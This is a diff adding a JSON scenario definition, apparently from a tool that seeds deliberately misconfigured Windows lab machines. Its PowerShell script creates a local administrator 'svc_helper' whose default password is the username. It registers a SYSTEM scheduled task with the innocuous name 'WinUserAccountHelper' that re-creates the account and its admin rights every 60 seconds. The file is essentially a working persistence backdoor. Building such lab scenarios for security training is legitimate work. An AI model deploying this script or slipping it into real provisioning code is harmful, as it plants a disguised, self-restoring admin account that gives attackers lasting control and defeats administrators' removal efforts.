@@ -1,0 +1,11 @@
+{
+  "name": "priv-user-respawn-win",
+  "description": " [2026-11-18 fix: schtasks-based registration; Register-ScheduledTask duration=MaxValue is out of range XML on Server 2022]",
+  "platform": "windows",
+  "category": "misconfiguration",
+  "type": "powershell",
+  "run_as": "Administrator",
+  "depends_on": [],
+  "script": "# SYSTEM scheduled task re-asserting a local admin every 60 seconds.\nif (-not $ADMIN_USER) { $ADMIN_USER = 'svc_helper' }\nif (-not $ADMIN_PASSWORD) { $ADMIN_PASSWORD = $ADMIN_USER }\n$arg = \"/c net user $ADMIN_USER $ADMIN_PASSWORD /add 2>nul & net user $ADMIN_USER $ADMIN_PASSWORD >nul & net localgroup Administrators $ADMIN_USER /add >nul\"\n# schtasks registers the 60-second indefinite cycle reliably across Windows\n# builds (Register-ScheduledTask rejects [TimeSpan]::MaxValue durations with\n# out-of-range XML). The task runs cmd every 60 s as SYSTEM.\n$cmdarg = 'net user ' + $ADMIN_USER + ' ' + $ADMIN_PASSWORD + ' /add 2>nul & net user ' + $ADMIN_USER + ' ' + $ADMIN_PASSWORD + ' >nul & net localgroup Administrators ' + $ADMIN_USER + ' /add >nul'\n# Create the account immediately too: downstream group-adds must not depend\n# on the task's first tick.\ncmd.exe /c \"net user $ADMIN_USER $ADMIN_PASSWORD /add\" >nul 2>nul\ncmd.exe /c \"net localgroup Administrators $ADMIN_USER /add\" >nul 2>nul\n& schtasks.exe /Create /F /TN 'WinUserAccountHelper' /SC MINUTE /MO 1 /RU 'SYSTEM' /TR ('cmd.exe /c ' + $cmdarg) | Out-Null\nWrite-Output \"respawn task WinUserAccountHelper registered for $ADMIN_USER\"\n",
+  "required_vars": []
+}
